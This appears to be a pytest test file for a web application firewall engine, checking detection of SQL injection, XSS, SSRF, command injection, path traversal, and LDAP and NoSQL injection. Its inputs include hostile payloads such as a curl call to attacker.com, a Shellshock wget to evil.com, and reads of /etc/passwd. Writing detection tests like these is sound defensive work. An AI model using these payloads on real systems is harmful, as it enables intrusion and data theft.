"""Unit tests for the WAF engine — verifies SQLi, XSS, SSRF, RCE, path traversal,
LDAP injection, NoSQL injection detection, caching behavior, and false positive rate."""

from __future__ import annotations

import pytest
from cybernova.protection.waf import waf_engine


def test_sqli_detection():
    result = waf_engine.analyze_request("GET", "/search", {"q": "1' OR '1'='1"}, None, None, "10.0.0.1")
    assert result["attack_detected"] is True
    assert result["blocked"] is True
    assert any(f["category"] == "sqli" for f in result["findings"])
    assert result["max_risk_score"] >= 85.0


def test_union_sqli():
    result = waf_engine.analyze_request("GET", "/api/users", {"id": "1 UNION SELECT * FROM users"}, None, None, "10.0.0.1")
    assert result["attack_detected"] is True
    assert any(f["rule"] == "sql_union_select" for f in result["findings"])


def test_xss_script_tag():
    result = waf_engine.analyze_request("GET", "/comment", {"msg": "<script>alert('xss')</script>"}, None, None, "10.0.0.1")
    assert result["attack_detected"] is True
    assert any(f["category"] == "xss" for f in result["findings"])


def test_xss_event_handler():
    result = waf_engine.analyze_request("GET", "/profile", {"bio": "Click <img src=x onerror=alert(1)>"}, None, None, "10.0.0.1")
    assert result["attack_detected"] is True
    assert any(f["rule"] == "xss_event_handler_payload" for f in result["findings"])


def test_xss_javascript_protocol():
    result = waf_engine.analyze_request("GET", "/redirect", {"url": "javascript:alert('xss')"}, None, None, "10.0.0.1")
    assert result["attack_detected"] is True


def test_ssrf_metadata():
    result = waf_engine.analyze_request("GET", "http://169.254.169.254/latest/meta-data/", {}, None, {"User-Agent": "curl/7.68"}, "10.0.0.1")
    assert result["attack_detected"] is True
    assert any(f["category"] == "ssrf" for f in result["findings"])


def test_ssrf_localhost():
    result = waf_engine.analyze_request("GET", "/fetch", {"url": "http://127.0.0.1:5432"}, None, None, "10.0.0.1")
    assert result["attack_detected"] is True


def test_ssrf_file_protocol():
    result = waf_engine.analyze_request("GET", "/download", {"path": "file:///etc/passwd"}, None, None, "10.0.0.1")
    assert result["attack_detected"] is True


def test_command_injection_backtick():
    result = waf_engine.analyze_request("GET", "/ping", {"host": "8.8.8.8; cat /etc/passwd"}, None, None, "10.0.0.1")
    assert result["attack_detected"] is True
    assert any(f["category"] == "cmd_injection" for f in result["findings"])


def test_command_injection_subshell():
    result = waf_engine.analyze_request("GET", "/ping", {"host": "$(cat /etc/passwd)"}, None, None, "10.0.0.1")
    assert result["attack_detected"] is True
    assert any(f["rule"] == "cmd_subshell" for f in result["findings"])


def test_command_injection_curl():
    result = waf_engine.analyze_request("GET", "/webhook", {"url": "http://evil.com; curl http://attacker.com/exfil"}, None, None, "10.0.0.1")
    assert result["attack_detected"] is True
    assert any(f["rule"] == "cmd_curl" for f in result["findings"])


def test_path_traversal():
    result = waf_engine.analyze_request("GET", "/download", {"file": "../../../etc/passwd"}, None, None, "10.0.0.1")
    assert result["attack_detected"] is True
    assert any(f["category"] == "path_traversal" for f in result["findings"])


def test_path_traversal_windows():
    result = waf_engine.analyze_request("GET", "/download", {"file": "..\\..\\windows\\system32\\config"}, None, None, "10.0.0.1")
    assert result["attack_detected"] is True


def test_ldap_injection():
    result = waf_engine.analyze_request("GET", "/ldap", {"user": "*)(uid=*))(|(uid=*"}, None, None, "10.0.0.1")
    assert result["attack_detected"] is True
    assert any(f["category"] == "ldap_injection" for f in result["findings"])


def test_nosql_injection():
    result = waf_engine.analyze_request("GET", "/api/data", {"filter": '{"$gt": ""}'}, None, None, "10.0.0.1")
    assert result["attack_detected"] is True
    assert any(f["category"] == "nosql_injection" for f in result["findings"])


def test_clean_request_no_false_positive():
    result = waf_engine.analyze_request("GET", "/api/users", {"page": "1", "limit": "10"}, None, None, "10.0.0.1")
    assert result["attack_detected"] is False
    assert result["blocked"] is False
    assert result["finding_count"] == 0


def test_clean_post_body():
    result = waf_engine.analyze_request("POST", "/api/login", {}, '{"username": "john", "password": "secret123"}', {"Content-Type": "application/json"}, "10.0.0.1")
    assert result["attack_detected"] is False


def test_suspicious_not_blocked():
    """Low-risk findings should not trigger block."""
    result = waf_engine.analyze_request("GET", "/search", {"q": "information_schema"}, None, None, "10.0.0.1")
    assert result["attack_detected"] is True
    # information_schema alone has risk 92 but we need the pattern to match
    assert any(f["rule"] == "sql_information_schema" for f in result["findings"])


def test_waf_cache_hit():
    """Identical requests should return cached result."""
    waf_engine.clear_cache()
    result1 = waf_engine.analyze_request("GET", "/search", {"q": "1' OR '1'='1"}, None, None, "10.0.0.1")
    result2 = waf_engine.analyze_request("GET", "/search", {"q": "1' OR '1'='1"}, None, None, "10.0.0.1")
    assert result1 == result2
    stats = waf_engine.get_stats()
    assert stats["cache"]["hits"] >= 1
    assert stats["cache"]["misses"] == 1


def test_waf_cache_miss():
    """Different requests should not hit cache."""
    waf_engine.clear_cache()
    waf_engine.analyze_request("GET", "/a", {"q": "test1"}, None, None, "10.0.0.1")
    waf_engine.analyze_request("GET", "/b", {"q": "test2"}, None, None, "10.0.0.1")
    stats = waf_engine.get_stats()
    assert stats["cache"]["hits"] == 0
    assert stats["cache"]["misses"] == 2


def test_waf_stats():
    """WAF stats should return structured data."""
    stats = waf_engine.get_stats()
    assert "total_inspections" in stats
    assert "cache" in stats
    assert "rules_count" in stats
    assert stats["rules_count"] > 0
    assert "hits" in stats["cache"]
    assert "misses" in stats["cache"]
    assert "hit_rate" in stats["cache"]


def test_analyze_event_suricata():
    result = waf_engine.analyze_event({
        "event_type": "suricata_alert",
        "extra_data": {
            "method": "GET",
            "url": "/search?q=1'+OR+'1'='1",
        },
        "source_ip": "10.0.0.1",
    })
    assert result is not None
    assert result["attack_detected"] is True


def test_analyze_event_wrong_type():
    result = waf_engine.analyze_event({"event_type": "heartbeat"})
    assert result is None


def test_analyze_event_empty():
    result = waf_engine.analyze_event({})
    assert result is None


def test_multi_attack_in_one_request():
    """Combined SQLi + XSS in same request."""
    result = waf_engine.analyze_request("GET", "/search", {"q": "1' OR '1'='1<script>alert(1)</script>"}, None, None, "10.0.0.1")
    assert result["attack_detected"] is True
    categories = {f["category"] for f in result["findings"]}
    assert "sqli" in categories
    assert "xss" in categories


def test_url_encoded_attack():
    """URL-encoded XSS should be detected after decoding."""
    result = waf_engine.analyze_request("GET", "/search", {"q": "%3Cscript%3Ealert(1)%3C/script%3E"}, None, None, "10.0.0.1")
    assert result["attack_detected"] is True
    assert any(f["category"] == "xss" for f in result["findings"])


def test_headers_scanning():
    """Malicious input in headers should also be caught."""
    result = waf_engine.analyze_request("GET", "/api/data", {}, None, {
        "User-Agent": "() { :; }; /bin/bash -c 'wget http://evil.com'",
        "Cookie": "session=1; admin=1' OR '1'='1",
    }, "10.0.0.1")
    assert result["attack_detected"] is True


def test_sleep_based_sqli():
    result = waf_engine.analyze_request("GET", "/api", {"id": "1; SLEEP(5)--"}, None, None, "10.0.0.1")
    assert result["attack_detected"] is True


def test_benchmark_based_sqli():
    result = waf_engine.analyze_request("GET", "/api", {"id": "1 BENCHMARK(10000000,MD5(1))"}, None, None, "10.0.0.1")
    assert result["attack_detected"] is True
